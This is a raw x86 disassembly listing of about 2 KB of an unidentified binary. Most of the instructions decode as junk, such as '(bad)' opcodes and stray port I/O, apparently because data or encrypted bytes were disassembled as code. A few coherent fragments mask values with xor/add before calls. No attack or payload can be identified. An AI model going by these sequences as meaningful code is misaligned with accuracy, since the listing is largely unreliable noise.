  407a6e:	mov    al,0x34
  407a70:	ja     0x407a95
  407a72:	int3   
  407a73:	mov    cl,0x49
  407a75:	sbb    DWORD PTR [edx],esi
  407a77:	xchg   esp,eax
  407a78:	jp     0x407a95
  407a7a:	(bad)  
  407a7c:	stc    
  407a7d:	sub    eax,0x5dfce7b7
  407a82:	enter  0xb055,0x6e
  407a86:	mov    ds:0x8c5c05da,al
  407a8b:	add    DWORD PTR [eax+0x6e],ecx
  407a8e:	xchg   ecx,eax
  407a8f:	mov    esp,0xed285c45
  407a94:	fdiv   QWORD PTR [ecx+0x2f28413b]
  407a9a:	push   0x4a39b6fd
  407a9f:	xchg   esp,eax
  407aa0:	adc    BYTE PTR [eax-0x6d13c8cb],dl
  407aa6:	mov    ecx,0x5cd92891
  407aab:	xchg   edi,eax
  407aac:	mov    cl,0x7e
  407aae:	loopne 0x407ada
  407ab0:	fwait
  407ab1:	jl     0x407a40
  407ab3:	and    al,0x6
  407ab5:	les    edx,FWORD PTR [esi]
  407ab7:	mov    esi,0x41d936a9
  407abc:	dec    edi
  407abd:	xor    ah,ch
  407abf:	ins    BYTE PTR es:[edi],dx
  407ac0:	or     eax,0x13679aa2
  407ac5:	adc    bh,bh
  407ac7:	sbb    dh,BYTE PTR fs:[ebp-0x7bd2d6e3]
  407ace:	jbe    0x407ab3
  407ad0:	adc    eax,0x1bc5ca4
  407ad5:	inc    ebx
  407ad6:	test   eax,0xfb58ed06
  407adb:	mov    bl,0x82
  407add:	not    ebx
  407adf:	aam    0xea
  407ae1:	pop    edi
  407ae2:	jae    0x407b29
  407ae4:	cld    
  407ae5:	xor    al,0xb8
  407ae7:	jae    0x407a82
  407ae9:	xor    al,0x8a
  407aeb:	dec    esp
  407aec:	xor    ecx,ebp
  407aee:	sar    WORD PTR [esi+ecx*8-0x1e9e5e50],cl
  407af6:	out    0x0,eax
  407af8:	mov    DWORD PTR [ebp+eax*4+0xdab0f80],0x9e8b082e
  407b03:	push   cs
  407b04:	mov    dh,al
  407b06:	xchg   edx,eax
  407b07:	ja     0x407a9b
  407b09:	daa    
  407b0a:	repz sub ebx,0xba8701a8
  407b11:	pop    edx
  407b12:	pusha  
  407b13:	test   BYTE PTR [esi],0x33
  407b16:	mov    BYTE PTR [ebx],0xc7
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	or     eax,DWORD PTR [ecx-0x47]
  407b42:	into   
  407b43:	push   edi
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b90
  407b4c:	push   esi
  407b4d:	mov    ds:0x53903b05,al
  407b52:	nop
  407b53:	mov    al,ds:0x397c5cc1
  407b58:	(bad)  
  407b59:	pop    esp
  407b5a:	jno    0x407b97
  407b5c:	dec    edi
  407b5d:	add    al,0xec
  407b5f:	rcl    DWORD PTR [ebp+0x1dca163a],0x3b
  407b66:	jae    0x407bb2
  407b68:	sub    ah,BYTE PTR [ebp+0x19213ca9]
  407b6e:	(bad)  
  407b6f:	jp     0x407bd6
  407b71:	jbe    0x407bda
  407b73:	xor    eax,esp
  407b75:	aam    0x31
  407b77:	sbb    ecx,DWORD PTR [ecx-0x5b]
  407b7a:	xchg   DWORD PTR [ecx-0x11],edx
  407b7d:	jbe    0x407bca
  407b7f:	or     al,0xc3
  407b81:	fisub  WORD PTR [eax+0x68c067e5]
  407b87:	call   0xe65d3013
  407b8c:	leave  
  407b8d:	push   ecx
  407b8e:	nop
  407b8f:	jecxz  0x407bbe
  407b91:	repnz xor DWORD PTR [edi+edi*4+0x1f],eax
  407b96:	dec    ecx
  407b97:	mov    cl,0x20
  407b99:	push   cs
  407b9a:	sub    al,0x30
  407b9c:	loope  0x407b62
  407b9e:	ret    0x4293
  407ba1:	fs mov ah,0xe3
  407ba4:	mov    ch,bh
  407ba6:	cdq    
  407ba7:	mov    ah,0x4b
  407ba9:	dec    ebp
  407baa:	loopne 0x407c20
  407bac:	or     ebx,DWORD PTR [ecx-0x47]
  407baf:	pop    esp
  407bb0:	mov    esp,0xc8ead971
  407bb5:	xlat   BYTE PTR ds:[ebx]
  407bb6:	xchg   DWORD PTR [ebp-0x46cb3a3],ecx
  407bbc:	fldenv [ebx]
  407bbe:	pop    esp
  407bbf:	mov    ch,0x72
  407bc1:	and    bh,BYTE PTR [ebx+0x603d2de0]
  407bc7:	rcr    DWORD PTR [esi],cl
  407bc9:	mov    esp,0xab035ac8
  407bce:	cwde   
  407bcf:	pop    ebp
  407bd0:	pop    ecx
  407bd1:	hlt    
  407bd2:	fcomp  st(3)
  407bd4:	adc    DWORD PTR [ebx-0x441ddd99],esi
  407bda:	mov    edi,0x8bf6d9f4
  407bdf:	xchg   DWORD PTR [ebx+0x7a],eax
  407be2:	jno    0x407bc1
  407be4:	cmp    DWORD PTR [eax-0x7463a2d6],edi
  407bea:	push   eax
  407beb:	mov    bh,0xbb
  407bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bee:	jbe    0x407c16
  407bf0:	mov    ch,0xdd
  407bf2:	jne    0x407bbf
  407bf4:	inc    esi
  407bf5:	pop    es
  407bf6:	xor    esp,DWORD PTR [esi]
  407bf8:	push   es
  407bf9:	loop   0x407b7d
  407bfb:	loop   0x407c30
  407bfd:	dec    edi
  407bfe:	jo     0x407c70
  407c00:	inc    edi
  407c01:	push   0xffffffec
  407c03:	add    BYTE PTR [eax+0x8967c3b],dh
  407c09:	loop   0x407beb
  407c0b:	test   edi,esp
  407c0d:	in     eax,0x15
  407c0f:	or     ch,cl
  407c11:	pop    edx
  407c12:	pop    edx
  407c13:	outs   dx,DWORD PTR ds:[esi]
  407c14:	cmp    edi,DWORD PTR [ebp-0x5a]
  407c17:	xor    ch,dl
  407c19:	xor    eax,0x2984f820
  407c1e:	call   0x1b90:0xeab50289
  407c25:	dec    ecx
  407c26:	fwait
  407c27:	cmp    DWORD PTR [ecx],esp
  407c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c2a:	adc    BYTE PTR [eax],al
  407c2c:	push   es
  407c2d:	adc    cl,bl
  407c2f:	aaa    
  407c30:	mov    esi,0x907281d7
  407c35:	retf   0xcb52
  407c38:	sbb    esi,ebx
  407c3a:	jl     0x407c3a
  407c3c:	sbb    eax,esi
  407c3e:	mov    al,ds:0x57d4d7ac
  407c43:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c45:	xor    edx,DWORD PTR [edi+ebx*2+0x303d0c97]
  407c4c:	add    dl,ch
  407c4e:	cwde   
  407c4f:	or     BYTE PTR cs:[esi+0x27424349],dl
  407c56:	xchg   ebx,eax
  407c57:	(bad)  
  407c59:	mov    al,ds:0xca273ce3
  407c5e:	push   ebx
  407c5f:	or     cl,cl
  407c61:	in     eax,0xa3
  407c63:	sbb    DWORD PTR [ebp-0x5a],0x5fc14f34
  407c6a:	(bad)  
  407c6b:	out    dx,al
  407c6c:	retf   0x66e2
  407c6f:	sahf   
  407c70:	jbe    0x407c22
  407c72:	test   eax,0x969f2771
  407c77:	cmp    edx,DWORD PTR [ebx+0x67]
  407c7a:	cs loope 0x407c92
  407c7d:	(bad)
  407c80:	pushf  
  407c81:	stos   BYTE PTR es:[edi],al
  407c82:	sbb    al,0xd1
  407c84:	mov    edx,0x81cceda7
  407c89:	into   
  407c8a:	shr    DWORD PTR [ecx+0x9],cl
  407c8d:	lods   al,BYTE PTR ds:[esi]
  407c8e:	das    
  407c8f:	fwait
  407c90:	pop    edi
  407c91:	out    dx,eax
  407c92:	xor    eax,0x58ad3d86
  407c97:	shl    DWORD PTR [edi+0x72c3bcac],cl
  407c9d:	lahf   
  407c9e:	pop    esi
  407c9f:	scas   al,BYTE PTR es:[edi]
  407ca0:	ds aaa 
  407ca2:	retf   0xfd66
  407ca5:	lahf   
  407ca6:	jae    0x407d06
  407ca8:	mov    esp,0xffb9ad3b
  407cad:	iret   
  407cae:	mov    BYTE PTR [eax+esi*4+0x70bde461],bl
  407cb5:	dec    edi
  407cb6:	sub    dl,BYTE PTR [ecx-0x66474472]
  407cbc:	dec    ebp
  407cbd:	sbb    al,0xc3
  407cbf:	lahf   
  407cc0:	pop    es
  407cc1:	int    0xcc
  407cc3:	push   esi
  407cc4:	jp     0x407d03
  407cc6:	in     al,dx
  407cc7:	data16 jg 0x407d3d
  407cca:	stos   BYTE PTR es:[edi],al
  407ccb:	inc    esp
  407ccc:	shl    BYTE PTR [esi+0x3a],0xbe
  407cd0:	sub    esi,DWORD PTR ds:0xc25f8ee8
  407cd6:	mov    ebx,0x2402a6ee
  407cdb:	aad    0xd1
  407cdd:	bound  esi,QWORD PTR [esi-0x25]
  407ce0:	test   DWORD PTR [ecx-0x2cf2e97b],esi
  407ce6:	inc    ecx
  407ce7:	xor    BYTE PTR es:[edi],al
  407cea:	push   ecx
  407ceb:	push   esi
  407cec:	mov    ebp,0xd85ad9e
  407cf1:	mov    cl,0x55
  407cf3:	arpl   sp,bp
  407cf5:	test   ebp,ebp
  407cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cf8:	outs   dx,DWORD PTR ds:[esi]
  407cf9:	daa    
  407cfa:	or     DWORD PTR [ebx-0x7c3b63c5],edx
  407d00:	(bad)  
  407d01:	cmp    ebp,esi
  407d03:	add    DWORD PTR [edx+ebp*4+0x14],ecx
  407d07:	xchg   ecx,eax
  407d08:	int    0x2e
  407d0a:	repz xchg esi,eax
  407d0c:	sbb    ebx,edx
  407d0e:	bound  eax,QWORD PTR [ebp+edx*1+0x4bfce9f8]
  407d15:	cmp    eax,edx
  407d17:	dec    edi
  407d18:	test   eax,0x9565354f
  407d1d:	cld    
  407d1e:	mov    ebp,0x24e8ed68
  407d23:	gs xor eax,0x2380d754
  407d29:	out    dx,al
  407d2a:	pushf  
  407d2b:	mov    ebp,DWORD PTR [esi+0x1946f606]
  407d31:	cmp    edi,DWORD PTR [eax+0x56]
  407d34:	adc    BYTE PTR [esi+0x23c89085],bl
  407d3a:	sti    
  407d3b:	jl     0x407d2f
  407d3d:	jnp    0x407d0c
  407d3f:	ficomp DWORD PTR [eax]
  407d41:	xor    dl,BYTE PTR [edx+0x21bd0c7f]
  407d47:	pop    eax
  407d48:	test   BYTE PTR fs:[ecx-0x229f5ab1],dh
  407d4f:	out    dx,al
  407d50:	out    0xc,eax
  407d52:	xor    edx,esp
  407d54:	fstp   QWORD PTR [ebx+0x23fdba78]
  407d5a:	ret    
  407d5b:	clc    
  407d5c:	sar    BYTE PTR [esi-0x66],cl
  407d5f:	mov    BYTE PTR [edx+0x3c],bh
  407d62:	fwait
  407d63:	in     al,0xc8
  407d65:	popf   
  407d66:	push   0x1e754c7
  407d6b:	add    al,0xa8
  407d6d:	js     0x407d4e
  407d6f:	cld    
  407d70:	xlat   BYTE PTR ds:[ebx]
  407d71:	jno    0x407d56
  407d73:	add    eax,0x3f8d59a5
  407d78:	sbb    cl,al
  407d7a:	mov    edi,DWORD PTR ds:0xab10ffa1
  407d80:	sbb    bh,BYTE PTR [edi-0x6e]
  407d83:	popfw  
  407d85:	int    0x19
  407d87:	mov    esi,0x50b0230c
  407d8c:	mov    DWORD PTR [ebx-0x21],ebx
  407d8f:	sbb    al,0xb
  407d91:	aam    0x11
  407d93:	out    0xd4,al
  407d95:	xor    esp,DWORD PTR [ebp+ebx*1+0x7d]
  407d99:	adc    BYTE PTR [eax],al
  407d9b:	sbb    eax,0xcc01196
  407da0:	outs   dx,DWORD PTR ds:[esi]
  407da1:	push   edi
  407da2:	in     al,0x92
  407da4:	dec    esi
  407da5:	push   ebx
  407da6:	sbb    DWORD PTR [eax+0x6c96804f],eax
  407dac:	loop   0x407d83
  407dae:	and    bh,dl
  407db0:	les    ebx,FWORD PTR [eax-0x4e15fe59]
  407db6:	sbb    edi,ebx
  407db8:	fsub   QWORD PTR [ebx-0x63]
  407dbb:	inc    esp
  407dbc:	daa    
  407dbd:	sub    esp,esi
  407dbf:	in     al,dx
  407dc0:	rol    edi,cl
  407dc2:	loope  0x407df8
  407dc4:	aaa    
  407dc5:	lods   al,BYTE PTR ds:[esi]
  407dc6:	or     BYTE PTR [edx],dh
  407dc8:	push   edi
  407dc9:	push   ecx
  407dca:	cmp    bl,cl
  407dcc:	frndint 
  407dce:	mov    edi,ecx
  407dd0:	data16 int3 
  407dd2:	out    dx,eax
  407dd3:	ja     0x407dfd
  407dd5:	sbb    esp,DWORD PTR [esi-0x73349abb]
  407ddb:	inc    edx
  407ddc:	mov    ebx,0x609922b0
  407de1:	fnstenv [esi]
  407de3:	in     eax,0x49
  407de5:	out    0x37,al
  407de7:	sub    DWORD PTR [eax],esi
  407de9:	jae    0x407e6a
  407deb:	or     al,0x12
  407ded:	push   es
  407dee:	jp     0x407e67
  407df0:	mov    ah,0x99
  407df2:	mov    ebx,db4
  407df5:	repnz bound eax,QWORD PTR [esi-0x2a]
  407df9:	bound  ebx,QWORD PTR [ebx]
  407dfb:	test   DWORD PTR [ebp-0x25],edx
  407dfe:	ret    
  407dff:	dec    ecx
  407e00:	cmp    BYTE PTR [eax+esi*4],cl
  407e03:	loopne 0x407e03
  407e05:	imul   edi,eax,0x63
  407e08:	or     eax,0x43dd5327
  407e0d:	(bad)  
  407e0e:	neg    eax
  407e10:	(bad)  [ebx+0x63802c8e]
  407e16:	out    0xdb,eax
  407e18:	js     0x407e8c
  407e1a:	dec    al
  407e1c:	and    al,0x3d
  407e1e:	loope  0x407da0
  407e20:	xchg   ebx,eax
  407e21:	push   es
  407e22:	jnp    0x407e5b
  407e24:	(bad)  
  407e25:	mov    edx,0x70a9ccf3
  407e2a:	adc    al,0xf1
  407e2c:	lock ror DWORD PTR [ecx-0x7e],0x5f
  407e31:	not    edx
  407e33:	add    bl,BYTE PTR [esi]
  407e35:	xor    esi,esp
  407e37:	pop    ebx
  407e38:	inc    esi
  407e39:	and    al,0x5d
  407e3b:	je     0x407eba
  407e3d:	fiadd  WORD PTR [esi]
  407e3f:	inc    edx
  407e40:	xor    eax,0xa82de354
  407e45:	jo     0x407e73
  407e47:	lods   eax,DWORD PTR ds:[esi]
  407e48:	in     eax,dx
  407e49:	xchg   edx,eax
  407e4a:	or     eax,0x36c72038
  407e4f:	(bad)  
  407e50:	push   ds
  407e51:	mov    ah,0x42
  407e53:	cmp    esi,edi
  407e55:	push   esp
  407e56:	into   
  407e57:	mov    BYTE PTR [eax+0x2],dl
  407e5a:	(bad)  
  407e5c:	xchg   ecx,eax
  407e5d:	test   DWORD PTR [esi+0x5f762c34],ecx
  407e63:	mov    WORD PTR [ebp+0x5ad0da09],ss
  407e69:	imul   esp,DWORD PTR [ecx],0xffffffef
  407e6c:	shl    cl,0x71
  407e6f:	xchg   ebp,eax
  407e70:	mov    ds:0xe6753869,al
  407e75:	xchg   edi,eax
  407e76:	ror    BYTE PTR [edx],cl
  407e78:	or     BYTE PTR [esi-0x5dc417f2],ah
  407e7e:	add    BYTE PTR [eax],al
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	pushf  
  407e99:	mov    esi,0xd5077c64
  407e9e:	jo     0x407f10
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407e51
  407ea5:	das    
  407ea6:	mov    esp,0xc26699f0
  407eab:	pusha  
  407eac:	aaa    
  407ead:	mov    ds:0x62c7e89d,eax
  407eb2:	push   es
  407eb3:	push   ebp
  407eb4:	mov    ebp,0xb0956ff8
  407eb9:	and    DWORD PTR [esi-0x43],edi
  407ebc:	inc    eax
  407ebd:	and    bl,dh
  407ebf:	fs jb  0x407f3b
  407ec2:	dec    ecx
  407ec3:	pop    edx
  407ec4:	mov    BYTE PTR [edi+0x57eddedc],bh
  407eca:	xchg   esi,eax
  407ecb:	add    eax,0x33189303
  407ed0:	shl    DWORD PTR [ebp+0x2a],1
  407ed3:	mov    esi,0x7877aaf1
  407ed8:	retf   
  407ed9:	shl    eax,1
  407edb:	mov    fs,WORD PTR ss:[ecx+0x72]
  407edf:	push   edi
  407ee0:	mov    eax,0xc798c6d8
  407ee5:	or     DWORD PTR [eax+eax*1+0x60011d45],0xffffff80
  407eed:	cmp    BYTE PTR ds:0xa55bac52,cl
  407ef3:	aas    
  407ef4:	push   ecx
  407ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ef6:	(bad)  [esi-0x67]
  407ef9:	iret   
  407efa:	in     al,dx
  407efb:	inc    ebx
  407efc:	xchg   esi,eax
  407efd:	shl    BYTE PTR [ebp+0x2576269a],1
  407f03:	xchg   edi,eax
  407f04:	adc    eax,0xc4a75c40
  407f09:	loope  0x407f1c
  407f0b:	repnz dec edx
  407f0d:	jne    0x407ef7
  407f0f:	popa   
  407f10:	pop    eax
  407f11:	inc    edx
  407f12:	mov    edx,0x68e9cdf7
  407f17:	idiv   bl
  407f19:	dec    ecx
  407f1a:	or     al,0x95
  407f1c:	jp     0x407f43
  407f1e:	pop    eax
  407f1f:	jnp    0x407f67
  407f21:	mul    BYTE PTR [esi-0x7]
  407f24:	push   edx
  407f25:	mov    WORD PTR [ebx+0x60506140],ss
  407f2b:	loope  0x407f76
  407f2d:	xor    dh,BYTE PTR [ebp+0xb66b920]
  407f33:	and    al,0x46
  407f35:	push   edx
  407f36:	arpl   WORD PTR [edi-0x5b],di
  407f39:	add    bl,BYTE PTR [edi]
  407f3b:	cwde   
  407f3c:	inc    ecx
  407f3d:	xlat   BYTE PTR ds:[ebx]
  407f3e:	mov    ds:0x9f9a8b4f,al
  407f43:	jp     0x407f69
  407f45:	push   0xffffffc2
  407f47:	dec    edi
  407f48:	lea    edx,[ecx-0x144da7a9]
  407f4e:	mov    bl,0xf3
  407f50:	adc    dl,BYTE PTR [ecx+ecx*4]
  407f53:	dec    edi
  407f54:	dec    eax
  407f55:	mov    ah,0x54
  407f57:	fild   WORD PTR [ecx+0x7d]
  407f5a:	sbb    al,ch
  407f5c:	movups XMMWORD PTR [esi-0x2d341857],xmm1
  407f63:	rcr    BYTE PTR [ebp-0x4e9588a0],cl
  407f69:	mov    al,0xee
  407f6b:	sub    DWORD PTR cs:[ebp-0x601727dd],edi
  407f72:	fs sub edx,ecx
  407f75:	enter  0x5a1a,0x77
  407f79:	adc    ebp,DWORD PTR [edi+0x7b]
  407f7c:	sbb    al,0xa
  407f7e:	sbb    eax,0x61eeda4b
  407f83:	fcmovne st,st(7)
  407f85:	mov    dl,0x89
  407f87:	or     edi,ecx
  407f89:	pop    ecx
  407f8a:	push   eax
  407f8b:	fs (bad) 
  407f8d:	lea    esp,[edx]
  407f8f:	mov    ebx,0x35fc287
  407f94:	pushf  
  407f95:	mov    eax,ds:0x8b819cf5
  407f9a:	push   ebp
  407f9b:	lods   eax,DWORD PTR ds:[esi]
  407f9c:	mov    edi,0x104798af
  407fa1:	stos   DWORD PTR es:[edi],eax
  407fa2:	pop    esi
  407fa3:	pop    esi
  407fa4:	or     BYTE PTR [edx-0x7d46efa5],0x4d
  407fab:	lahf   
  407fac:	inc    edx
  407fad:	arpl   cx,dx
  407faf:	fs scas eax,DWORD PTR es:[edi]
  407fb1:	cli    
  407fb2:	bound  ebp,QWORD PTR [edi+0x3b]
  407fb5:	jae    0x407f9c
  407fb7:	jecxz  0x408009
  407fb9:	cmp    DWORD PTR [edx],eax
  407fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fbc:	iret   
  407fbd:	pop    ecx
  407fbe:	mov    edi,0x5c42eb29
  407fc3:	in     al,dx
  407fc4:	jp     0x408040
  407fc6:	and    DWORD PTR [edi-0x525d138],esi
  407fcc:	(bad)  
  407fcd:	addr16 loope 0x407f64
  407fd0:	popf   
  407fd1:	in     eax,dx
  407fd2:	gs jo  0x407f6b
  407fd5:	push   ds
  407fd6:	cmp    BYTE PTR [ebp+0x5f],dh
  407fd9:	jecxz  0x408035
  407fdb:	dec    eax
  407fdc:	jns    0x408054
  407fde:	stos   DWORD PTR es:[edi],eax
  407fdf:	cs iret 
  407fe1:	fldenv [ebp+0x2cca618a]
  407fe7:	add    bl,0x4d
  407fea:	(bad)  
  407fec:	mov    ebx,0xe37b8568
  407ff1:	pop    ds
  407ff2:	stos   BYTE PTR es:[edi],al
  407ff3:	mov    dh,0xa9
  407ff5:	les    eax,FWORD PTR [edx+edi*1-0x60c1fb9e]
  407ffc:	jmp    0x5195:0xf24664e8
  408003:	mov    ds:0x8afdbbac,al
  408008:	repnz push edx
  40800a:	mov    ds,WORD PTR [edx-0x63]
  40800d:	sar    bl,1
  40800f:	call   0x5b50:0x38a7a475
  408016:	cmp    ah,BYTE PTR [edi+edi*2+0x24824ccc]
  40801d:	cmp    eax,0x31c13cd1
  408022:	mov    dh,0x1d
  408024:	(bad)  
  408025:	mov    ch,0xf7
  408027:	fdiv   st(6),st
  408029:	mov    ds:0x8d80c4b4,al
  40802e:	mov    BYTE PTR [ebx],0xad
  408031:	aas    
  408032:	xchg   dl,dl
  408034:	adc    eax,0x8f15155
  408039:	imul   edi,DWORD PTR [ebx+0x44],0xd02782b1
  408040:	xor    BYTE PTR [edx-0x10],ah
  408043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408044:	mov    cl,0x4b
  408046:	dec    esi
  408047:	in     eax,dx
  408048:	ror    BYTE PTR es:[edx],cl
  40804b:	rcl    BYTE PTR [ecx],1
  40804d:	aam    0x7
  40804f:	(bad)  
  408050:	(bad)  
  408051:	xlat   BYTE PTR ds:[ebx]
  408052:	fs out 0xf6,al
  408055:	stos   BYTE PTR es:[edi],al
  408056:	sbb    bl,BYTE PTR [edx+0x7ef850ad]
  40805c:	arpl   WORD PTR [edx-0x2],dx
  40805f:	retf   0x28ff
  408062:	push   ebp
  408063:	and    ecx,DWORD PTR [ebx-0x39]
  408066:	or     edi,eax
  408068:	fmulp  st(1),st
  40806a:	mov    esi,0xf0db7d90
  40806f:	mov    dh,0x7e
  408071:	fucomp st(1)
  408073:	adc    esi,DWORD PTR gs:[esp+ecx*1+0x2c]
  408078:	jl     0x4080d6
  40807a:	lea    esi,[esi-0x5d]
  40807d:	push   0x5f
  40807f:	ins    DWORD PTR es:[edi],dx
  408080:	sbb    al,0x51
  408082:	mov    BYTE PTR [eax+ebp*1],0xdc
  408086:	inc    ecx
  408087:	pushf  
  408088:	rol    BYTE PTR [ebp+0x8],cl
  40808b:	outs   dx,BYTE PTR ds:[esi]
  40808c:	fsave  [edx]
  40808f:	lods   al,BYTE PTR ds:[esi]
  408090:	dec    esp
  408091:	sub    eax,0x5b211943
  408096:	fsub   QWORD PTR [ecx*2+0x382348ff]
  40809d:	icebp  
  40809e:	mov    al,0xe8
  4080a0:	test   DWORD PTR [ebp+0xa],0x3fdb80f
  4080a7:	sub    eax,0x7599d49
  4080ac:	imul   DWORD PTR [ecx-0x64142b3a]
  4080b2:	cmp    ch,BYTE PTR [ebx]
  4080b4:	in     eax,0x82
  4080b6:	mov    ah,0x45
  4080b8:	fimul  WORD PTR [ecx+eax*2-0x13675477]
  4080bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080c0:	mov    bh,0xa0
  4080c2:	add    eax,0x4263429d
  4080c7:	lea    edx,[edx]
  4080c9:	inc    ecx
  4080ca:	xor    DWORD PTR [edi+0x67cb395d],ebp
  4080d0:	inc    eax
  4080d1:	sbb    edx,eax
  4080d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080d4:	aaa    
  4080d5:	inc    edi
  4080d6:	push   es
  4080d7:	in     al,0x99
  4080d9:	es xchg esp,eax
  4080db:	mov    bh,0x26
  4080dd:	jmp    0xec4dd67e
  4080e2:	adc    BYTE PTR gs:[edx-0x71d1b20e],0x8a
  4080ea:	stos   BYTE PTR es:[edi],al
  4080eb:	adc    al,0x77
  4080ed:	push   edi
  4080ee:	gs scas eax,DWORD PTR es:[edi]
  4080f0:	daa    
  4080f1:	inc    esi
  4080f2:	dec    edi
  4080f3:	fwait
  4080f4:	shl    BYTE PTR [ebp-0x24ef1073],1
  4080fa:	arpl   WORD PTR [edx-0x6b453394],sp
  408100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408101:	pop    ecx
  408102:	mov    ds:0xd32623ab,eax
  408107:	(bad)  [ebx]
  408109:	jns    0x4080cb
  40810b:	clc    
  40810c:	pushf  
  40810d:	xchg   ebx,eax
  40810e:	je     0x40813c
  408110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408111:	aaa    
  408112:	sar    BYTE PTR [ecx],cl
  408114:	fild   DWORD PTR [ecx+0x762ec68e]
  40811a:	cmp    al,0x1f
  40811c:	add    DWORD PTR [esi-0x5b52661a],esp
  408122:	inc    esi
  408123:	ds sbb al,0xeb
  408126:	(bad)  
  408127:	(bad)  
  408128:	add    eax,0x471b9ea1
  40812d:	pop    edi
  40812e:	fisubr WORD PTR [ebp+0x5d]
  408131:	call   0x9b66:0x6f42e43
  408138:	sbb    BYTE PTR [edx-0x7d2bd776],0x3f
  40813f:	stos   BYTE PTR es:[edi],al
  408140:	jno    0x4080cb
  408142:	pop    es
  408143:	push   ss
  408144:	push   edx
  408145:	xor    DWORD PTR [edi],esi
  408147:	and    al,BYTE PTR [ecx]
  408149:	add    bl,0xe1
  40814c:	in     al,dx
  40814d:	mov    esi,0xbbee8be
  408152:	xor    ebx,DWORD PTR [eax+0x75ba4068]
  408158:	(bad)  
  408159:	fild   QWORD PTR [ecx]
  40815b:	or     eax,0x2d8bd447
  408160:	das    
  408161:	jp     0x4080f0
  408163:	adc    al,0x5f
  408165:	fdivrp st(5),st
  408167:	in     eax,dx
  408168:	cmp    eax,0xd1d6d513
  40816d:	sub    BYTE PTR [ecx+0x1a],cl
  408170:	test   eax,0x674a38c
  408175:	push   edx
  408176:	jmp    0x8ecb:0xf16dd741
  40817d:	popa   
  40817e:	mov    bl,0x4b
  408180:	popf   
  408181:	fmul   DWORD PTR [edi+0x42]
  408184:	pop    eax
  408185:	jmp    FWORD PTR [eax+0x7c0c1473]
  40818b:	shl    BYTE PTR [ecx+ebx*4+0x70d6043e],1
  408192:	jmp    0x9567:0x1bbc8ff0
  408199:	add    al,0x27
  40819b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40819c:	cmp    ah,al
  40819e:	shr    BYTE PTR [ebx+0x1d],0x42
  4081a2:	pop    edi
  4081a3:	and    BYTE PTR [edi],dl
  4081a5:	jge    0x4081a2
  4081a7:	inc    ecx
  4081a8:	xor    BYTE PTR [ecx+0x35],al
  4081ab:	data16 mov dl,0xdc
  4081ae:	js     0x408186
  4081b0:	xchg   ecx,eax
  4081b1:	add    BYTE PTR [ebx+ebx*1-0x13],bh
  4081b5:	(bad)  
  4081b6:	inc    esi
  4081b7:	std    
  4081b8:	mov    al,0x60
  4081ba:	xor    dh,BYTE PTR [ecx]
  4081bc:	mov    cl,0xc6
  4081be:	(bad)  
  4081bf:	pop    ds
  4081c0:	jo     0x40815e
  4081c2:	cwde   
  4081c3:	pusha  
  4081c4:	push   ecx
  4081c5:	adc    al,BYTE PTR [eax]
  4081c7:	pop    esp
  4081c8:	nop
  4081c9:	repnz and ah,BYTE PTR [edx+ecx*8+0x639610ef]
  4081d1:	push   ebx
  4081d2:	xchg   ecx,eax
  4081d3:	lea    eax,[di+0x4]
  4081d7:	mov    DWORD PTR [ebp-0x20],eax
  4081da:	je     0x40966c
  4081e0:	lea    eax,[ebp-0x18]
  4081e3:	push   eax
  4081e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
